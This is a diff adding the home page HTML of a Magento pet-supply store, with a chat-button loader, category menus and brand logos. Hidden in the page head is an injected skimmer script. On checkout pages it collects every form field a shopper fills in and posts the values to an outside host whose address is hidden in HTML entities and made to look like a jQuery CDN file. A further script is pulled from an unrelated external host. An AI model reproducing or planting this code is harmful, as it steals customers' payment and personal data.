@@ -1,0 +1,329 @@
+
+				<script type="text/javascript">
+					(function ()
+					{
+						// Localize jQuery variable
+						var jQuery;
+						/******** Load jQuery if not present *********/
+						if(window.jQuery === undefined || window.jQuery.fn.jquery !== "1.4.2")
+						{
+							var script_tag = document.createElement("script");
+							script_tag.setAttribute("type", "text/javascript");
+							script_tag.setAttribute("src",
+								"http://www.wilsonspets.ca/js/provide/jquery.min.js");
+							if(script_tag.readyState)
+							{
+								script_tag.onreadystatechange = function ()
+								{ // For old versions of IE
+									if(this.readyState == "complete" || this.readyState == "loaded")
+									{
+										scriptLoadHandler();
+									}
+								};
+							}
+							else
+							{ // Other browsers
+								script_tag.onload = scriptLoadHandler;
+							}
+							// Try to find the head, otherwise default to the documentElement
+							(document.getElementsByTagName("head")[0] || document.documentElement)
+								.appendChild(script_tag);
+						}
+						else
+						{
+							// The jQuery version on the window is the one we want to use
+							jQuery = window.jQuery;
+							main();
+						}
+						/******** Called once jQuery has loaded ******/
+						function scriptLoadHandler()
+						{
+							// Restore $ and window.jQuery to their previous values and store the
+							// new jQuery in our local jQuery variable
+							jQuery = window.jQuery.noConflict(true);
+							// Call our main function
+							main();
+						}
+						/******** Our main function ********/
+						function main()
+						{
+							jQuery(document)
+								.ready(function ($)
+								{
+									
+      
+        var BUTTONTEXT = 'ProvideSupport : chat button code loaded';
+		var HIDDENTEXT = 'ProvideSupport : hidden monitoring code loaded';
+		var f7php = new Object();
+		var f7s = new Object();
+		f7s = JSON.parse("{\"pluginEnabled\":true,\"buttonImageType\":\"graphic\",\"buttonImageSource\":\"account\",\"buttonImageUrlOnline\":false,\"buttonImageUrlOffline\":false,\"buttonImageTextOnline\":false,\"buttonImageTextOffline\":false,\"buttonLocation\":\"fixed\",\"buttonLocationVerticalBy\":\"%\",\"buttonLocationVerticalValue\":\"1\",\"buttonLocationVerticalFrom\":\"bottom\",\"buttonLocationHorizontalBy\":\"%\",\"buttonLocationHorizontalValue\":\"1\",\"buttonLocationHorizontalFrom\":\"right\",\"buttonAvailableMenus\":false,\"buttonAvailableMenusWhich\":false,\"buttonAvailableMenusList\":[\"left\"],\"buttonAvailablePost\":true,\"buttonAvailablePostWhich\":\"all\",\"buttonAvailablePostList\":[],\"buttonAvailableWhole\":true,\"buttonAvailableAll\":true}"); //f7php.settings
+		
+		
+		
+		f7php.code = "<!-- BEGIN ProvideSupport.com Graphics Chat Button Code -->\n<div id=\"ciq64f\" style=\"z-index:100;position:absolute\"><\/div><div id=\"scq64f\" style=\"display:inline;position:fixed;z-index:9999;right:1%;bottom:1%;\"><\/div><div id=\"sdq64f\" style=\"display:none\"><\/div><script type=\"text\/javascript\">var seq64f=document.createElement(\"script\");seq64f.type=\"text\/javascript\";var seq64fs=(location.protocol.indexOf(\"https\")==0?\"https\":\"http\")+\":\/\/image.providesupport.com\/js\/0ukesssf6xmok1il63xpwxkbmy\/safe-standard.js?ps_h=q64f&ps_t=\"+new Date().getTime();setTimeout(\"seq64f.src=seq64fs;document.getElementById('sdq64f').appendChild(seq64f)\",1)<\/script><noscript><div style=\"display:inline\"><a href=\"http:\/\/www.providesupport.com?messenger=0ukesssf6xmok1il63xpwxkbmy\">Customer Support Chat<\/a><\/div><\/noscript>\n<!-- END ProvideSupport.com Graphics Chat Button Code -->";
+		f7php.hiddencode = "<!-- BEGIN ProvideSupport.com Visitor Monitoring Code -->\n<div id=\"ciq64f\" style=\"z-index:100;position:absolute\"><\/div><div id=\"sdq64f\" style=\"display:none\"><\/div><script type=\"text\/javascript\">var seq64f=document.createElement(\"script\");seq64f.type=\"text\/javascript\";var seq64fs=(location.protocol.indexOf(\"https\")==0?\"https\":\"http\")+\":\/\/image.providesupport.com\/js\/0ukesssf6xmok1il63xpwxkbmy\/safe-monitor.js?ps_h=q64f&ps_t=\"+new Date().getTime();setTimeout(\"seq64f.src=seq64fs;document.getElementById('sdq64f').appendChild(seq64f)\",1)<\/script><noscript><div style=\"display:inline\"><a href=\"http:\/\/www.providesupport.com?monitor=0ukesssf6xmok1il63xpwxkbmy\">Customer Support Chat<\/a><\/div><\/noscript>\n<!-- END ProvideSupport.com Visitor Monitoring Code -->";
+		showChat = function (code)
+		{
+			var codeBlock = document.createElement('div');
+			
+			
+			
+			codeBlock.className = 'f7x';
+			document.body.appendChild(codeBlock);
+			
+			jQuery('.f7x').html(code);
+			
+			/*
+			conf = {'position': 'fixed','width': 'auto','height': 'auto','z-index': 10000}
+			jQuery('.f7x').css(conf);
+			*/
+			
+			jQuery('.f7x').css(f7s.buttonLocationHorizontalFrom, f7s.buttonLocationHorizontalValue + f7s.buttonLocationHorizontalBy);
+			jQuery('.f7x').css(f7s.buttonLocationVerticalFrom, f7s.buttonLocationVerticalValue + f7s.buttonLocationVerticalBy);
+			
+		};  showChat(f7php.code); console.log(BUTTONTEXT); 
+								});
+						}
+					})(); // We call our anonymous function immediately
+				</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Home page</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.wilsonspets.ca/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.wilsonspets.ca/skin/frontend/base/default/favicon.ico" type="image/x-icon" />
+<!-- Start WOWSlider.com HEAD section -->
+<link rel="stylesheet" type="text/css" href="sliders/Pets/engine1/style.css" />
+<script type="text/javascript" src="sliders/Pets/engine1/jquery.js"></script>
+<!-- End WOWSlider.com HEAD section -->
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.wilsonspets.ca/js/blank.html';
+    var BLANK_IMG = 'http://www.wilsonspets.ca/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/js/bookmepro_calendar/pikaday.css" />
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/wilsonspets/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/base/default/css/ch_style.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/wilsonspets/default/css/webandpeople/custommenu/custommenu.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/wilsonspets/default/css/stylesheet.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/base/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/prototype/window.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/collinsharper/canpost/checkout.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/bookme_calendar/jstz-1.0.4.min.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/bookmepro_calendar/pikaday.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/skin/frontend/wilsonspets/default/js/webandpeople/custommenu/custommenu.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.wilsonspets.ca/skin/frontend/base/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.wilsonspets.ca/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.wilsonspets.ca/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script>
+<script src="//0055d7b.netsolhost.com/Blog/lib2/js/js.js"> </script>
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        
+
+ <div id="primarynav">
+                
+                <div id="primarynav1">
+                	<div style="float:left;padding-top:10px;">
+                    	<a href="http://www.wilsonspets.ca/home"><img src="http://www.wilsonspets.ca/skin/frontend/wilsonspets/default/images/custom/logo.png" />
+                        </a>
+                	</div>
+                    <div style="float:right;">
+                    	<div class="mainnav" style="padding-top:5px;">
+                            	<ul class="links">
+                                	<li><a href="/">Home</a></li>
+                                    <li><a href="/about">About Us</a></li>
+                                    <li><a href="/contacts">Contact</a></li>
+                                    <li><a href="/employment">Employment</a></li>
+                            </div>
+                        <div style="padding-top:5px;">
+                        	<div id="searchbox" style="float:right;margin-top:2px;"><form id="search_mini_form" action="http://www.wilsonspets.ca/catalogsearch/result/?SID=7ppvm82v31kd97fsgol1qgoni1" method="get">
+    <div class="form-search">
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Go" class="button"><span><span>Go</span></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search entire store here...');
+            searchForm.initAutocomplete('http://www.wilsonspets.ca/catalogsearch/ajax/suggest/?SID=7ppvm82v31kd97fsgol1qgoni1', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+ </div>
+                    		<div style="float:right;padding-right:10px;"><a href="http://www.facebook.com/pages/Wilsons-Greenhouse-Garden-Centre/116898301707711" target="_blank" style="border:none;"><img src="http://www.wilsonspets.ca/skin/frontend/wilsonspets/default/images/custom/facebook.png"  /></a></div>
+                        </div>
+                        <div class="mainnav">
+                        	 <ul class="links">
+                        <li class="first" ><a href="http://www.wilsonspets.ca/customer/account/?SID=7ppvm82v31kd97fsgol1qgoni1" title="My Account" >My Account</a></li>
+                                <li ><a href="http://www.wilsonspets.ca/wishlist/?SID=7ppvm82v31kd97fsgol1qgoni1" title="My Wishlist" >My Wishlist</a></li>
+                                <li ><a href="http://www.wilsonspets.ca/checkout/cart/?SID=7ppvm82v31kd97fsgol1qgoni1" title="My Cart" class="top-link-cart">My Cart</a></li>
+                                <li ><a href="http://www.wilsonspets.ca/checkout/?SID=7ppvm82v31kd97fsgol1qgoni1" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li class=" last" ><a href="http://www.wilsonspets.ca/customer/account/login/?SID=7ppvm82v31kd97fsgol1qgoni1" title="Log In" >Log In</a></li>
+            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="primarynav2">
+                	<div class="nav-container">
+    <div id="custommenu" class="">
+                            <div id="menu4" class="menu" onmouseover="wpShowMenuPopup(this, event, 'popup4');" onmouseout="wpHideMenuPopup(this, event, 'popup4', 'menu4')">
+<div class="parentMenu">
+<a href="javascript:void(0);" rel="http://www.wilsonspets.ca/cat.html?SID=7ppvm82v31kd97fsgol1qgoni1">
+<span>Cat</span>
+</a>
+</div>
+</div>
+<div id="popup4" class="wp-custom-menu-popup" onmouseout="wpHideMenuPopup(this, event, 'popup4', 'menu4')" onmouseover="wpPopupOver(this, event, 'popup4', 'menu4')">
+<div class="block1">
+<div class="column first odd"><div class="itemMenu level1"><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/dry-food.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Dry Food</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/treats.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Treats</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/leashes.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Leashes</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/bowls-feeding-accessories.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Bowls &amp; Feeding Accessories</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/beds.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Beds</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/crates-carriers.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Crates &amp; Carriers</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/accessories.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Accessories</span></a></div></div><div class="column last even"><div class="itemMenu level1"><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/wet-food.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Wet Food</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/toys.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Toys</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/collars.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Collars</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/grooming-accessories.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Grooming &amp; Accessories</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/litter-accessories.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Litter &amp; Accessories</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/cat/clothing.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Clothing</span></a></div></div>
+<div class="clearBoth"></div>
+</div>
+<div id="wp_custom_menu_4" class="block2">
+<p><img src="http://www.wilsonspets.ca/media/wysiwyg/sectionheaders/menubackgrounds-cat.jpg" alt="" /></p>
+</div>
+</div>                    <div id="menu3" class="menu" onmouseover="wpShowMenuPopup(this, event, 'popup3');" onmouseout="wpHideMenuPopup(this, event, 'popup3', 'menu3')">
+<div class="parentMenu">
+<a href="javascript:void(0);" rel="http://www.wilsonspets.ca/dog.html?SID=7ppvm82v31kd97fsgol1qgoni1">
+<span>Dog</span>
+</a>
+</div>
+</div>
+<div id="popup3" class="wp-custom-menu-popup" onmouseout="wpHideMenuPopup(this, event, 'popup3', 'menu3')" onmouseover="wpPopupOver(this, event, 'popup3', 'menu3')">
+<div class="block1">
+<div class="column first odd"><div class="itemMenu level1"><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/dry-food.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Dry Food</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/treats.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Treats</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/leashes.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Leashes</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/bowls-feeding-accessories.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Bowls &amp; Feeding Accessories</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/beds.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Beds</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/clothing.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Clothing</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/tags.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Tags</span></a></div></div><div class="column last even"><div class="itemMenu level1"><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/wet-food.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Wet Food</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/toys.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Toys</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/collars.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Collars</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/grooming.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Grooming</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/crates-carriers.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Crates &amp; Carriers</span></a><a class="itemMenuName level1" href="http://www.wilsonspets.ca/dog/accessories.html?SID=7ppvm82v31kd97fsgol1qgoni1"><span>Accessories</span></a></div></div>
+<div class="clearBoth"></div>
+</div>
+<div id="wp_custom_menu_3" class="block2">
+<img src="http://www.wilsonspets.ca/media/wysiwyg/sectionheaders/menubackgrounds-dog.jpg" alt="" />
+</div>
+</div>                <div class="clearBoth"></div>
+    </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+var CUSTOMMENU_POPUP_WIDTH = 0;
+var CUSTOMMENU_POPUP_TOP_OFFSET = 0;
+var CUSTOMMENU_POPUP_DELAY_BEFORE_DISPLAYING = 48;
+var CUSTOMMENU_POPUP_DELAY_BEFORE_HIDING = 0;
+var CUSTOMMENU_RTL_MODE = 0;
+var wpCustommenuTimerShow = {};
+var wpCustommenuTimerHide = {};
+var wpActiveMenu = null;
+//]]>
+</script>
+                </div>
+                
+                
+                
+    		</div>
+        <!-- Start WOWSlider.com BODY section -->
+<div id="wowslider-container1">
+	<div class="ws_images"><ul>
+		<li><img src="sliders/Pets/data1/images/2.jpg" alt="2" title="2" id="wows1_0"/></li>
+	</ul></div>
+
+	<div class="ws_shadow"></div>
+</div>	
+<script type="text/javascript" src="sliders/Pets/engine1/wowslider.js"></script>
+<script type="text/javascript" src="sliders/Pets/engine1/script.js"></script>
+<!-- End WOWSlider.com BODY section -->
+<div>
+        <div class="main-container col1-layout">
+            <div class="main">
+                                <div class="col-main">
+                                        <div class="std"><h1 class="align-center">Treats &bull;&nbsp; Toys&nbsp; &bull;&nbsp; Pet Accessories</h1>
+<div>
+<p class="align-center">Welcome to Wilson's Pets!&nbsp;</p>
+<p class="align-center">We're currently undergoing some upgrades and improvements to our site.&nbsp; Thanks for your patience!</p>
+</div>
+<div style="width: 940px; margin-left: auto; margin-right: auto;">
+<div class="divider"><hr /></div>
+<h2 class="align-center">We proudly carry these fine brands of pet food</h2>
+<div style="width: 400px; margin-left: auto; margin-right: auto; margin-top: 10px; display: table;">
+<div style="display: table-cell;"><a href="http://www.acana.com/" target="_blank"><img class="homelogos" src="http://www.wilsonspets.ca/fileadmin/user_upload/images/logos/arcana.jpg" alt="" /></a></div>
+<div style="display: table-cell;"><a href="http://www.nutro.com/" target="_blank"><img class="homelogos" src="http://www.wilsonspets.ca/fileadmin/user_upload/images/logos/nutro.jpg" alt="" /></a></div>
+<div style="display: table-cell;"><a href="http://orijen.ca/" target="_blank"><img class="homelogos" src="http://www.wilsonspets.ca/fileadmin/user_upload/images/logos/oijen.jpg" alt="" /></a>&nbsp;</div>
+</div>
+</div></div>                </div>
+            </div>
+        </div>
+        <div class="footer-container">
+    <div class="footer">
+               	<h3>Contact us at (306) 955-9580 or <a href="http://wilsonspets.ca/shop/contacts/">send us an email</a></h3> 
+       
+
+        <div class="f-right">
+                        <ul>
+<li><a href="http://www.wilsonspets.ca/terms-conditions?SID=7ppvm82v31kd97fsgol1qgoni1">Terms &amp; Conditions</a></li>
+<li class="last privacy"><a href="http://www.wilsonspets.ca/privacy-policy-cookie-restriction-mode?SID=7ppvm82v31kd97fsgol1qgoni1">Privacy Policy</a></li>
+<li class="last privacy"><a href="http://www.wilsonspets.ca/returns?SID=7ppvm82v31kd97fsgol1qgoni1">Returns/Refunds</a></li>
+<li class="last privacy"><a href="http://www.wilsonspets.ca/disclaimer?SID=7ppvm82v31kd97fsgol1qgoni1">Disclaimer</a></li>
+</ul>            <ul class="links">
+                        <li class="first" ><a href="http://www.wilsonspets.ca/catalog/seo_sitemap/category/?SID=7ppvm82v31kd97fsgol1qgoni1" title="Site Map" >Site Map</a></li>
+                                <li ><a href="http://www.wilsonspets.ca/catalogsearch/term/popular/?SID=7ppvm82v31kd97fsgol1qgoni1" title="Search Terms" >Search Terms</a></li>
+                                <li ><a href="http://www.wilsonspets.ca/catalogsearch/advanced/?SID=7ppvm82v31kd97fsgol1qgoni1" title="Advanced Search" >Advanced Search</a></li>
+                                <li class=" last" ><a href="http://www.wilsonspets.ca/contacts/?SID=7ppvm82v31kd97fsgol1qgoni1" title="Contact Us" >Contact Us</a></li>
+            </ul>
+                        
+        </div>
+        <div class="f-left">
+         	<address><p><a href="http://www.wilsonsgreenhouse.ca" target="_blank">WILSON'S GREENHOUSE</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="http://www.wilsonsentertainmentpark.ca" target="_blank">WILSON'S ENTERTAINMENT PARK</a></p>
+<p>
+Copyright&copy; 2013 Wilson's Pets / Site Design <a href="http://www.scribblinz.com/" target="_blank">Scribblinz Studios</a></p></address> 
+            
+           
+            
+        </div>
+    </div>
+</div>
+            </div>
+</div>
+</body>
+</html>
+
